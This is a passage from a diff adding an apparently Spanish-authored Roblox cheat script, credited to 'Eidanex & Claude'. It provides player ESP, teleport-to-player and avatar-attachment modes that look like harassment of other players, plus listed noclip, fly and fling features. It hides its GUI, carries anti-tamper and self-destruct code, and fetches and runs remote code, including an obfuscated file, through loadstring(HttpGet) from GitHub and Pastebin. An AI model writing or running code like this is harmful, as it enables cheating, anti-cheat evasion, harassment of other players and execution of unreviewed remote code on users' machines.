@@ -1,0 +1,2455 @@
+--[[
+	✴ CLAUDEX v3.26
+	Por: Eidanex & Claude
+	ScriptBlox: scriptblox.com
+]]--
+
+if _G._ESP_LOADED then return end
+_G._ESP_LOADED = true
+
+-- ============ ANTI-TAMPER ============
+local _AT = {}
+do
+	local _lockMsg = "This metatable is locked."
+	local _dead = false
+
+	local _ref = {
+		inew = Instance.new,
+		pcall = pcall,
+		type = type,
+		error = error,
+		setmt = setmetatable,
+		getmt = getmetatable,
+		rawget = rawget,
+		rawset = rawset,
+		pairs = pairs,
+		ipairs = ipairs,
+		twait = task.wait,
+		tspawn = task.spawn,
+		mathrand = math.random,
+		strchar = string.char,
+		connect = game:GetService("RunService").Heartbeat.Connect,
+	}
+
+	local function _selfDestruct()
+		if _dead then return end
+		_dead = true
+		_ref.pcall(function()
+			if _AT._sg then _AT._sg:Destroy() end
+			if _AT._tsg then _AT._tsg:Destroy() end
+			for _, objs in _ref.pairs(_AT._obj or {}) do
+				for _, o in _ref.pairs(objs) do _ref.pcall(function() o:Destroy() end) end
+			end
+		end)
+		_G._ESP_LOADED = nil
+	end
+
+	function _AT.protectTable(t)
+		return _ref.setmt(t, {
+			__metatable = _lockMsg,
+		}	)
+	end
+
+	function _AT.protectReadOnly(t)
+		local proxy = {}
+		local mt = {
+			__metatable = _lockMsg,
+			__index = t,
+			__newindex = function()
+				_selfDestruct()
+				_ref.error("Tampering detected. Error code: 0x" .. string.format("%04X", _ref.mathrand(4096, 65535)))
+			end,
+			__len = function() return #t end,
+			__pairs = function() return _ref.pairs(t) end,
+			__ipairs = function() return _ref.ipairs(t) end,
+		}
+		return _ref.setmt(proxy, mt)
+	end
+
+	function _AT.checkIntegrity()
+		if _ref.type(Instance.new) ~= "function" then return false end
+		if _ref.type(pcall) ~= "function" then return false end
+		if _ref.type(setmetatable) ~= "function" then return false end
+		if _ref.type(task.wait) ~= "function" then return false end
+		if _ref.type(loadstring) ~= "function" then return false end
+		local tampered = false
+		_ref.pcall(function()
+			if _ref.type(game.HttpGet) ~= "function" then tampered = true end
+		end)
+		if tampered then return false end
+		return true
+	end
+
+	function _AT.startWatchdog(interval)
+		_ref.tspawn(function()
+			while not _dead do
+				if not _AT.checkIntegrity() then
+					_selfDestruct()
+					break
+				end
+				_ref.twait(interval or 5)
+			end
+		end)
+	end
+
+	_AT.protectTable(_AT)
+end
+-- ============ FIN ANTI-TAMPER ============
+
+local Players = game:GetService("Players")
+local RS = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+local LP = Players.LocalPlayer
+
+-- ============ CACHE ============
+local mfloor, mrand, mclamp = math.floor, math.random, math.clamp
+local msin = math.sin
+local schar = string.char
+local tconcat, tinsert = table.concat, table.insert
+local C3_RED = Color3.fromRGB(255, 0, 0)
+local C3_GREEN = Color3.fromRGB(0, 255, 0)
+local C3_WHITE = Color3.new(1, 1, 1)
+local C3_BLACK = Color3.new(0, 0, 0)
+local C3_YELLOW = Color3.fromRGB(255, 255, 100)
+local C3_ON = Color3.fromRGB(0, 255, 100)
+local C3_OFF = Color3.fromRGB(255, 80, 80)
+local C3_CLAUDEX = Color3.fromRGB(220, 120, 50)
+local V3_ZERO = Vector3.zero or Vector3.new(0, 0, 0)
+local RAD_N30 = math.rad(-30)
+local RAD_90 = math.rad(90)
+local RAD_180 = math.rad(180)
+
+local _obj = {}
+local _pcons = {}
+local _k = {}
+local _tick = 0
+local _gen = 0
+local _mainGen = _gen
+
+RS.Heartbeat:Connect(function()
+	if _gen ~= _mainGen then return end
+	_tick = _tick + 1
+end)
+
+local function _rn()
+	local t = {}
+	for i = 1, mrand(8, 14) do
+		t[i] = schar(mrand(1, 2) == 1 and mrand(65, 90) or mrand(97, 122))
+	end
+	return tconcat(t)
+end
+
+local function _gui()
+	local p
+	if gethui then
+		p = gethui()
+	elseif syn and syn.protect_gui then
+		local g = Instance.new("ScreenGui")
+		syn.protect_gui(g)
+		g.Parent = game:GetService("CoreGui")
+		return g
+	else
+		pcall(function()
+			p = game:GetService("CoreGui")
+		end)
+		if not p then p = LP:WaitForChild("PlayerGui") end
+	end
+	local g = Instance.new("ScreenGui")
+	g.Name = _rn()
+	g.ResetOnSpawn = false
+	g.Parent = p
+	return g
+end
+
+local function _cd(d)
+	if d <= 20 then return C3_RED
+	elseif d <= 30 then
+		local t = (d - 20) / 10
+		return Color3.fromRGB(255, mfloor(165 * t), 0)
+	elseif d <= 50 then
+		local t = (d - 30) / 20
+		return Color3.fromRGB(mfloor(255 * (1 - t)), mfloor(165 + 90 * t), 0)
+	else return C3_GREEN end
+end
+
+local function _dist(c)
+	local mc = LP.Character
+	if not mc then return nil end
+	local m = mc:FindFirstChild("HumanoidRootPart")
+	if not m or not c then return nil end
+	local r = c:FindFirstChild("HumanoidRootPart")
+	if not r then return nil end
+	return mfloor((m.Position - r.Position).Magnitude)
+end
+
+local function _cerca(ch, pl)
+	local v = ch:FindFirstChild("HumanoidRootPart")
+	if not v then return nil end
+	local cl, md = nil, 999999
+	for _, op in ipairs(Players:GetPlayers()) do
+		if op ~= pl and op.Character then
+			local oh = op.Character:FindFirstChild("HumanoidRootPart")
+			if oh then
+				local d = (oh.Position - v.Position).Magnitude
+				if d < md then md = d; cl = op.Name end
+			end
+		end
+	end
+	return cl
+end
+
+local _espOn = true
+local function _make(pl)
+	if pl == LP then return end
+	if not _espOn then return end
+	local _mg = _gen
+	local function _go(ch)
+		if not ch then return end
+		local hr = ch:WaitForChild("HumanoidRootPart", 5)
+		if not hr then return end
+
+		if _obj[pl] then
+			for _, o in pairs(_obj[pl]) do pcall(function() o:Destroy() end) end
+		end
+		_obj[pl] = {}
+
+		local hl
+		pcall(function()
+			hl = Instance.new("Highlight")
+			hl.Adornee = ch
+			hl.FillColor = C3_RED
+			hl.FillTransparency = 0.7
+			hl.OutlineColor = C3_WHITE
+			hl.OutlineTransparency = 0.3
+			pcall(function() hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop end)
+			hl.Name = _rn()
+			hl.Parent = ch
+		end)
+
+		local bb = Instance.new("BillboardGui")
+		bb.Adornee = hr
+		bb.Size = UDim2.new(0, 250, 0, 50)
+		bb.StudsOffset = Vector3.new(0, 3, 0)
+		bb.AlwaysOnTop = true
+		bb.Name = _rn()
+		bb.Parent = ch
+
+		local nl = Instance.new("TextLabel")
+		nl.Size = UDim2.new(1, 0, 0.5, 0)
+		nl.BackgroundTransparency = 1
+		nl.TextColor3 = C3_RED
+		nl.TextStrokeTransparency = 0.5
+		nl.TextStrokeColor3 = C3_BLACK
+		nl.Font = Enum.Font.Gotham
+		nl.TextSize = 13
+		nl.Text = pl.Name
+		nl.Name = _rn()
+		nl.Parent = bb
+
+		local dl = Instance.new("TextLabel")
+		dl.Size = UDim2.new(1, 0, 0.5, 0)
+		dl.Position = UDim2.new(0, 0, 0.5, 0)
+		dl.BackgroundTransparency = 1
+		dl.TextColor3 = C3_YELLOW
+		dl.TextStrokeTransparency = 0.5
+		dl.TextStrokeColor3 = C3_BLACK
+		dl.Font = Enum.Font.Gotham
+		dl.TextSize = 11
+		dl.Text = "0m"
+		dl.Name = _rn()
+		dl.Parent = bb
+
+		if hl then _obj[pl] = {hl, bb} else _obj[pl] = {bb} end
+
+		local cn
+		cn = RS.Heartbeat:Connect(function()
+			if _gen ~= _mg then cn:Disconnect() return end
+			if not ch or not ch.Parent then
+				cn:Disconnect()
+				return
+			end
+
+			if _tick % 4 ~= 0 then return end
+
+			local d = _dist(ch)
+			if not d then return end
+			dl.Text = d .. "m"
+			local k = _k[pl.Name] or 0
+
+			local co = _cd(d)
+			if hl then hl.FillColor = co end
+			nl.TextColor3 = co
+			if k > 0 then nl.Text = pl.Name .. " [" .. k .. " kills]"
+			else nl.Text = pl.Name end
+		end)
+	end
+
+	if pl.Character then _go(pl.Character) end
+	local ca = pl.CharacterAdded:Connect(function(c) if _gen ~= _mg then return end task.wait(0.5) _go(c) end)
+	if not _pcons[pl] then _pcons[pl] = {} end
+	table.insert(_pcons[pl], ca)
+end
+
+local function _del(pl)
+	if _obj[pl] then
+		for _, o in pairs(_obj[pl]) do pcall(function() o:Destroy() end) end
+		_obj[pl] = nil
+	end
+	if _pcons[pl] then
+		for _, c in pairs(_pcons[pl]) do pcall(function() c:Disconnect() end) end
+		_pcons[pl] = nil
+	end
+	_k[pl.Name] = nil
+end
+
+local function _td(pl)
+	local _mg = _gen
+	local function _oc(ch)
+		if _gen ~= _mg then return end
+		if not ch then return end
+		local hum = ch:WaitForChild("Humanoid", 5)
+		if not hum then return end
+		hum.Died:Connect(function()
+			if _gen ~= _mg then return end
+			local c = _cerca(ch, pl)
+			if c then _k[c] = (_k[c] or 0) + 1 end
+		end)
+	end
+	if pl.Character then _oc(pl.Character) end
+	local ca = pl.CharacterAdded:Connect(function(c) if _gen ~= _mg then return end _oc(c) end)
+	if not _pcons[pl] then _pcons[pl] = {} end
+	table.insert(_pcons[pl], ca)
+end
+
+local function _md()
+	local _mg = _gen
+	local function _om(ch)
+		if _gen ~= _mg then return end
+		if not ch then return end
+		local hum = ch:WaitForChild("Humanoid", 5)
+		if not hum then return end
+		hum.Died:Connect(function() if _gen ~= _mg then return end _k = {} end)
+	end
+	if LP.Character then _om(LP.Character) end
+	LP.CharacterAdded:Connect(function(c) if _gen ~= _mg then return end _om(c) end)
+end
+
+-- ============ TP ============
+local _sg = _gui()
+_AT._sg = _sg
+local _tm = 0
+local _spd = 100
+local _mv = false
+local _tc = nil
+local _lf
+local _open = true
+local _tg
+local _dsg
+local _dtab, _dpanel, _tinfo
+local _dopen = false
+local _yuFrame
+local _spFrame
+local _noclip, _nccon
+local _ncParts = {}
+local _bright, _brightOG
+local _slide
+local _grav, _gravOG, _gravCon, _gravGyro, _gravBV, _gravMoveCon
+local _ncb, _brb, _dsb, _grb
+local _invis
+local _toggleInvis
+local _ivL
+local _fling = false
+local _flingCon
+local _infJump = false
+local _ijCon
+local _antiRag = false
+local _antiRagCons = {}
+local _antiRagCharCon
+local _clearAntiRag
+local _yupiSpd = 10
+_AT._fpsBoost = false
+local _fpsOG = {}
+local _fpsDisabled = {}
+local _fpbb
+_AT._antiTouch = false
+local _atCon
+local _atb
+_AT._xray = false
+local _xrayParts = {}
+local _xrb
+local _freeCam = false
+local _fcPart, _fcCon
+local _fcb
+local _antiAfk = false
+local _afkCon
+local _afkb
+local _jerkOn = false
+local _jerkOrigC0 = {}
+local _jerkBindName = "CX_Jerk_" .. tostring(mrand(100000, 999999))
+local _flyOn = false
+local _flyBV, _flyGyro, _flyCon, _flyStateCon, _flyAnimCon
+local _fyb
+local _flySpd = 80
+local _initPlayer
+local _anchorOn = false
+local _anchorOG = {}
+_AT._rag = { on = false, con = nil, btn = nil, disable = nil }
+local Lighting = game:GetService("Lighting")
+
+local _tb = Instance.new("TextButton")
+_tb.Size = UDim2.new(0, 40, 0, 40)
+_tb.Position = UDim2.new(0, 10, 0.5, -20)
+_tb.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+_tb.BackgroundTransparency = 0.3
+_tb.TextColor3 = Color3.fromRGB(0, 200, 255)
+_tb.Font = Enum.Font.GothamBold
+_tb.TextSize = 18
+_tb.Text = "TP"
+_tb.Name = _rn()
+_tb.Parent = _sg
+Instance.new("UICorner", _tb).CornerRadius = UDim.new(0, 8)
+local _tbStr = Instance.new("UIStroke")
+_tbStr.Color = Color3.fromRGB(0, 200, 255)
+_tbStr.Thickness = 1
+_tbStr.Transparency = 0.5
+_tbStr.Parent = _tb
+
+local _mb = Instance.new("TextButton")
+_mb.Size = UDim2.new(0, 40, 0, 25)
+_mb.Position = UDim2.new(0, 10, 0.5, 25)
+_mb.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+_mb.BackgroundTransparency = 0.3
+_mb.TextColor3 = C3_ON
+_mb.Font = Enum.Font.Gotham
+_mb.TextSize = 9
+_mb.Text = "INST"
+_mb.Name = _rn()
+_mb.Parent = _sg
+Instance.new("UICorner", _mb).CornerRadius = UDim.new(0, 6)
+local _mbStr = Instance.new("UIStroke")
+_mbStr.Color = C3_ON
+_mbStr.Thickness = 1
+_mbStr.Transparency = 0.5
+_mbStr.Parent = _mb
+
+local _mdf = Instance.new("Frame")
+_mdf.Size = UDim2.new(0, 140, 0, 200)
+_mdf.Position = UDim2.new(0.5, -70, 0.5, -100)
+_mdf.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+_mdf.BackgroundTransparency = 0.15
+_mdf.BorderSizePixel = 0
+_mdf.Visible = false
+_mdf.Name = _rn()
+_mdf.Parent = _sg
+Instance.new("UICorner", _mdf).CornerRadius = UDim.new(0, 8)
+local _mdfStr = Instance.new("UIStroke")
+_mdfStr.Color = C3_ON
+_mdfStr.Thickness = 1
+_mdfStr.Transparency = 0.5
+_mdfStr.Parent = _mdf
+local _mdfPad = Instance.new("UIPadding")
+_mdfPad.PaddingTop = UDim.new(0, 6)
+_mdfPad.PaddingBottom = UDim.new(0, 6)
+_mdfPad.PaddingLeft = UDim.new(0, 6)
+_mdfPad.PaddingRight = UDim.new(0, 6)
+_mdfPad.Parent = _mdf
+
+local _mdl = Instance.new("UIListLayout")
+_mdl.Padding = UDim.new(0, 4)
+_mdl.HorizontalAlignment = Enum.HorizontalAlignment.Center
+_mdl.SortOrder = Enum.SortOrder.LayoutOrder
+_mdl.Parent = _mdf
+
+local _mNames = {"INST", "SUAVE", "SOMBRERO", "COSTAL", "VALIENTE", "VISTA"}
+local _mColors = {C3_ON, Color3.fromRGB(255, 200, 0), Color3.fromRGB(255, 0, 200), Color3.fromRGB(255, 100, 0), C3_RED, Color3.fromRGB(100, 200, 255)}
+
+local function _setMode(mode)
+	local _prev = _tm
+	if _mv and _tc then _tc:Disconnect(); _mv = false end
+	if _prev >= 2 and _prev <= 4 then
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then hum.Sit = false end
+		end)
+	end
+	if _prev == 5 then
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then game.Workspace.CurrentCamera.CameraSubject = hum end
+		end)
+	end
+	_tm = mode
+	_yuFrame.Visible = (_tm == 4)
+	_spFrame.Visible = (_tm == 1)
+	_mb.Text = _mNames[mode + 1]
+	_mb.TextColor3 = _mColors[mode + 1]
+	_mdf.Visible = false
+end
+
+for i, name in ipairs(_mNames) do
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(1, 0, 0, 28)
+	btn.LayoutOrder = i
+	btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	btn.BackgroundTransparency = 0.3
+	btn.TextColor3 = _mColors[i]
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 12
+	btn.TextXAlignment = Enum.TextXAlignment.Center
+	btn.TextYAlignment = Enum.TextYAlignment.Center
+	btn.Text = name
+	btn.Name = _rn()
+	btn.Parent = _mdf
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+	btn.MouseButton1Click:Connect(function()
+		_setMode(i - 1)
+	end)
+end
+
+_mb.MouseButton1Click:Connect(function()
+	if _tm == 5 then
+		pcall(function()
+			local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+			if hum then game.Workspace.CurrentCamera.CameraSubject = hum end
+		end)
+	end
+	_mdf.Visible = not _mdf.Visible
+end)
+
+local _rst = Instance.new("TextButton")
+_rst.Size = UDim2.new(0, 40, 0, 25)
+_rst.Position = UDim2.new(0, 10, 0.5, 55)
+_rst.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+_rst.BackgroundTransparency = 0.3
+_rst.TextColor3 = Color3.fromRGB(255, 50, 50)
+_rst.Font = Enum.Font.GothamBold
+_rst.TextSize = 9
+_rst.Text = "RST"
+_rst.Name = _rn()
+_rst.Parent = _sg
+Instance.new("UICorner", _rst).CornerRadius = UDim.new(0, 6)
+local _rstStr = Instance.new("UIStroke")
+_rstStr.Color = Color3.fromRGB(255, 50, 50)
+_rstStr.Thickness = 1
+_rstStr.Transparency = 0.4
+_rstStr.Parent = _rst
+
+local function _doRST()
+	if _AT._rstBusy then return end
+	_AT._rstBusy = true
+	_gen = _gen + 1
+
+	-- ═══ FASE 1: Desactivar flags (nada nuevo se ejecuta) ═══
+	_noclip = false
+	_bright = false
+	_slide = false
+	_AT._fpsBoost = false
+	_AT._antiTouch = false
+	_AT._xray = false
+	_freeCam = false
+	_antiAfk = false
+	_infJump = false
+	_fling = false
+	_antiRag = false
+	_invis = false
+	_jerkOn = false
+	_flyOn = false
+	_anchorOn = false
+	_AT._rag.on = false
+	_grav = false
+	if _mv and _tc then _tc:Disconnect(); _mv = false end
+	task.wait()
+
+	-- ═══ FASE 2: Desconectar TODAS las conexiones ═══
+	local cons = {
+		_nccon, _gravCon, _gravMoveCon, _ijCon, _atCon, _fcCon, _afkCon, _antiRagCharCon, _flyCon, _flyStateCon, _flyAnimCon, _AT._rag.con,
+	}
+	for _, c in ipairs(cons) do
+		if c then pcall(function() c:Disconnect() end) end
+	end
+	_nccon = nil; _gravCon = nil; _gravMoveCon = nil; _ijCon = nil
+	_atCon = nil; _fcCon = nil; _afkCon = nil; _antiRagCharCon = nil; _flyCon = nil
+	_flyStateCon = nil; _flyAnimCon = nil; _AT._rag.con = nil
+	pcall(function() _clearAntiRag() end)
+	pcall(function() RS:UnbindFromRenderStep(_jerkBindName) end)
+	task.wait()
+
+	-- ═══ FASE 3: Destruir objetos fisicos (BodyVelocity, BodyGyro, etc) ═══
+	local bodies = { _gravBV, _gravGyro, _fcPart, _flyBV, _flyGyro }
+	for _, b in ipairs(bodies) do
+		if b then pcall(function() b:Destroy() end) end
+	end
+	_gravBV = nil; _gravGyro = nil; _fcPart = nil; _flyBV = nil; _flyGyro = nil
+	task.wait()
+
+	-- ═══ FASE 4: Restaurar el personaje ═══
+	pcall(function()
+		local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+		if hum then
+			hum.Sit = false
+			hum.PlatformStand = false
+			hum.WalkSpeed = 16
+			pcall(function() hum.JumpPower = 50 end)
+			hum:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
+			hum:SetStateEnabled(Enum.HumanoidStateType.Running, true)
+			hum:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, true)
+			hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+			hum:SetStateEnabled(Enum.HumanoidStateType.Landed, true)
+			hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+		end
+		local anim = LP.Character and LP.Character:FindFirstChild("Animate")
+		if anim then anim.Disabled = false end
+	end)
+	-- jerk (solo apagar flag, el loop se muere solo)
+	_jerkOn = false
+	_jerkOrigC0 = {}
+	-- anclar: restaurar Anchored original
+	pcall(function()
+		local ch = LP.Character
+		if ch then
+			for _, p in ipairs(ch:GetDescendants()) do
+				if p:IsA("BasePart") then
+					local og = _anchorOG[p]
+					pcall(function() p.Anchored = (og ~= nil) and og or false end)
+				end
+			end
+		end
+		_anchorOG = {}
+	end)
+	-- noclip partes
+	for i = 1, #_ncParts do
+		local p = _ncParts[i]
+		if p and p.Parent then pcall(function() p.CanCollide = true end) end
+	end
+	_ncParts = {}
+	task.wait()
+
+	-- ═══ FASE 5: Restaurar mundo (gravedad, luz, x-ray, fps) ═══
+	pcall(function() game.Workspace.Gravity = _gravOG or 196.2 end)
+	pcall(function()
+		if _brightOG and _brightOG.amb then
+			Lighting.Ambient = _brightOG.amb
+			Lighting.OutdoorAmbient = _brightOG.out
+			Lighting.Brightness = _brightOG.bright
+			Lighting.FogEnd = _brightOG.fog
+			Lighting.ClockTime = _brightOG.time
+		end
+		for _, e in ipairs(Lighting:GetDescendants()) do
+			if e:IsA("Atmosphere") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") then
+				e.Enabled = true
+			end
+		end
+	end)
+	pcall(function() Lighting.GlobalShadows = _fpsOG.gs ~= nil and _fpsOG.gs or true end)
+	for _, v in ipairs(_fpsDisabled) do pcall(function() v.Enabled = true end) end
+	_fpsDisabled = {}
+	for _, d in ipairs(_xrayParts) do pcall(function() d.part.Transparency = d.orig end) end
+	_xrayParts = {}
+	-- camara
+	pcall(function()
+		local cam = workspace.CurrentCamera
+		cam.CameraType = Enum.CameraType.Custom
+		local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+		if hum then cam.CameraSubject = hum end
+	end)
+	task.wait()
+
+	-- ═══ FASE 6: Apagar motores externos (fling, invis) ═══
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt"))()
+	end)
+	pcall(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/3Rnd9rHf"))()
+	end)
+	task.wait()
+
+	-- ═══ FASE 7: Destruir GUI ═══
+	for pl, objs in pairs(_obj) do
+		for _, o in pairs(objs) do pcall(function() o:Destroy() end) end
+	end
+	pcall(function() _sg:Destroy() end)
+	pcall(function() _dsg:Destroy() end)
+	_G._ESP_LOADED = nil
+	task.wait(0.3)
+
+	-- ═══ FASE 8: Ejecutar desde GitHub (ya no queda nada corriendo) ═══
+	local ok = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/eidanexb-dotcom/-mis-scripts/refs/heads/main/esp.lua?nocache=" .. tostring(tick()) .. tostring(math.random(100000, 999999)), true))()
+	end)
+	if not ok then _AT._rstBusy = false end
+end
+_rst.MouseButton1Click:Connect(_doRST)
+
+
+_lf = Instance.new("ScrollingFrame")
+_lf.Size = UDim2.new(0, 200, 0, 300)
+_lf.Position = UDim2.new(0, 60, 0.5, -150)
+_lf.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+_lf.BackgroundTransparency = 0.2
+_lf.BorderSizePixel = 0
+_lf.ScrollBarThickness = 4
+_lf.Visible = false
+_lf.Name = _rn()
+_lf.Parent = _sg
+Instance.new("UICorner", _lf).CornerRadius = UDim.new(0, 8)
+local _ll = Instance.new("UIListLayout")
+_ll.Padding = UDim.new(0, 3)
+_ll.SortOrder = Enum.SortOrder.Name
+_ll.Parent = _lf
+
+local function _rl()
+	for _, c in pairs(_lf:GetChildren()) do
+		if c:IsA("TextButton") then c:Destroy() end
+	end
+	for _, p in ipairs(Players:GetPlayers()) do
+		if p ~= LP then
+			local btn = Instance.new("TextButton")
+			btn.Size = UDim2.new(1, -6, 0, 40)
+			btn.Position = UDim2.new(0, 3, 0, 0)
+			btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+			btn.BackgroundTransparency = 0.3
+			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+			btn.Font = Enum.Font.Gotham
+			btn.TextSize = 12
+			btn.Text = p.Name
+			btn.TextXAlignment = Enum.TextXAlignment.Left
+			btn.Name = _rn()
+			btn.Parent = _lf
+			Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+
+			local av = Instance.new("ImageLabel")
+			av.Size = UDim2.new(0, 30, 0, 30)
+			av.Position = UDim2.new(0, 5, 0.5, -15)
+			av.BackgroundTransparency = 1
+			av.Parent = btn
+			Instance.new("UICorner", av).CornerRadius = UDim.new(1, 0)
+			task.spawn(function()
+				local ok, img = pcall(function()
+					return Players:GetUserThumbnailAsync(p.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
+				end)
+				if ok and av and av.Parent then av.Image = img end
+			end)
+
+			local pad = Instance.new("UIPadding")
+			pad.PaddingLeft = UDim.new(0, 45)
+			pad.Parent = btn
+
+			btn.MouseButton1Click:Connect(function()
+				if not p.Parent then return end
+				if not p.Character or not p.Character:FindFirstChild("HumanoidRootPart") then return end
+				if not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then return end
+				local myHRP = LP.Character.HumanoidRootPart
+				local head = p.Character:FindFirstChild("Head")
+				local function _unsit()
+					pcall(function() local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid"); if h then h.Sit = false end end)
+				end
+				local function _pleft()
+					if not p.Parent then _tc:Disconnect(); _mv = false; _unsit(); return true end
+					return false
+				end
+				if _tm == 1 then
+					if _mv and _tc then _tc:Disconnect() end
+					_mv = true
+					_tc = RS.Heartbeat:Connect(function(dt)
+						if not _mv then _tc:Disconnect() return end
+						if _pleft() then return end
+						local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+						if not myRoot then _tc:Disconnect(); _mv = false; return end
+						local tHead = p.Character and p.Character:FindFirstChild("Head")
+						if not tHead then return end
+						local target = tHead.Position + Vector3.new(0, 2, 0)
+						local dir3 = target - myRoot.Position
+						if dir3.Magnitude < 3 then
+							pcall(function() myRoot.CFrame = CFrame.new(target) end)
+							_tc:Disconnect()
+							_mv = false
+							return
+						end
+						pcall(function()
+							myRoot.Velocity = V3_ZERO
+							myRoot.CFrame = myRoot.CFrame + dir3.Unit * _spd * dt
+						end)
+					end)
+				elseif _tm == 2 then
+					if _mv and _tc then _tc:Disconnect() end
+					local tTop = head or (p.Character and (p.Character:FindFirstChild("UpperTorso") or p.Character:FindFirstChild("Torso")))
+					if not tTop then return end
+					local _sOff = head and 2 or 3.5
+					pcall(function()
+						myHRP.CFrame = CFrame.new(tTop.Position + Vector3.new(0, _sOff, 0))
+						local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+						if hum then hum.Sit = true end
+					end)
+					_mv = true
+					_tc = RS.Heartbeat:Connect(function()
+						if not _mv then _tc:Disconnect() return end
+						if _pleft() then return end
+						local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+						if not myRoot then _tc:Disconnect(); _mv = false; return end
+						local tH = p.Character and (p.Character:FindFirstChild("Head") or p.Character:FindFirstChild("UpperTorso") or p.Character:FindFirstChild("Torso"))
+						if not tH then return end
+						local off = p.Character:FindFirstChild("Head") and 2 or 3.5
+						pcall(function()
+							myRoot.CFrame = tH.CFrame * CFrame.new(0, off, 0)
+							myRoot.Velocity = V3_ZERO
+						end)
+					end)
+				elseif _tm == 3 then
+					if _mv and _tc then _tc:Disconnect() end
+					local tTorso = p.Character and (p.Character:FindFirstChild("UpperTorso") or p.Character:FindFirstChild("Torso"))
+					if not tTorso then return end
+					pcall(function()
+						myHRP.CFrame = tTorso.CFrame * CFrame.new(0, 0, 1.2) * CFrame.Angles(RAD_180, 0, RAD_90)
+						local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+						if hum then hum.Sit = true end
+					end)
+					_mv = true
+					_tc = RS.Heartbeat:Connect(function()
+						if not _mv then _tc:Disconnect() return end
+						if _pleft() then return end
+						local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+						if not myRoot then _tc:Disconnect(); _mv = false; return end
+						local tT = p.Character and (p.Character:FindFirstChild("UpperTorso") or p.Character:FindFirstChild("Torso"))
+						if not tT then return end
+						pcall(function()
+							myRoot.CFrame = tT.CFrame * CFrame.new(0, 0, 1.2) * CFrame.Angles(RAD_180, 0, RAD_90)
+							myRoot.Velocity = V3_ZERO
+						end)
+					end)
+				elseif _tm == 4 then
+					if _mv and _tc then _tc:Disconnect() end
+					local tTorso = p.Character and (p.Character:FindFirstChild("UpperTorso") or p.Character:FindFirstChild("Torso"))
+					if not tTorso then return end
+					pcall(function()
+						myHRP.CFrame = tTorso.CFrame * CFrame.new(0, 1, 1.5)
+						local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+						if hum then hum.Sit = true end
+					end)
+					_mv = true
+					_tc = RS.Heartbeat:Connect(function()
+						if not _mv then _tc:Disconnect() return end
+						if _pleft() then return end
+						local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+						if not myRoot then _tc:Disconnect(); _mv = false; return end
+						local tT = p.Character and (p.Character:FindFirstChild("UpperTorso") or p.Character:FindFirstChild("Torso"))
+						if not tT then return end
+						pcall(function()
+							local yupi = msin(tick() * _yupiSpd) * 0.6
+							myRoot.CFrame = tT.CFrame * CFrame.new(0, 1, 1.5 + yupi)
+							myRoot.Velocity = V3_ZERO
+						end)
+					end)
+				elseif _tm == 5 then
+					pcall(function()
+						local tHum = p.Character and p.Character:FindFirstChildOfClass("Humanoid")
+						if tHum then
+							game.Workspace.CurrentCamera.CameraSubject = tHum
+						end
+					end)
+				else
+					pcall(function()
+						local tHRP = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
+						if tHRP then myHRP.CFrame = tHRP.CFrame * CFrame.new(0, 0, 5) end
+					end)
+				end
+			end)
+		end
+	end
+	_lf.CanvasSize = UDim2.new(0, 0, 0, _ll.AbsoluteContentSize.Y + 10)
+end
+
+_tb.MouseButton1Click:Connect(function()
+	_lf.Visible = not _lf.Visible
+	if _lf.Visible then _rl() end
+end)
+
+Players.PlayerAdded:Connect(function()
+	if _gen ~= _mainGen then return end
+	if _lf.Visible then _rl() end
+end)
+Players.PlayerRemoving:Connect(function()
+	if _gen ~= _mainGen then return end
+	task.wait(0.5)
+	if _lf.Visible then _rl() end
+end)
+
+-- ============ MENU TOGGLE ============
+_tg = Instance.new("TextButton")
+_tg.Size = UDim2.new(0, 55, 0, 25)
+_tg.Position = UDim2.new(0, 10, 0.5, -70)
+_tg.BackgroundColor3 = C3_CLAUDEX
+_tg.BackgroundTransparency = 0.2
+_tg.TextColor3 = C3_WHITE
+_tg.Font = Enum.Font.GothamBold
+_tg.TextSize = 9
+_tg.Text = ">>>"
+_tg.Name = _rn()
+_tg.Parent = _sg
+Instance.new("UICorner", _tg).CornerRadius = UDim.new(0, 8)
+local _tgStr = Instance.new("UIStroke")
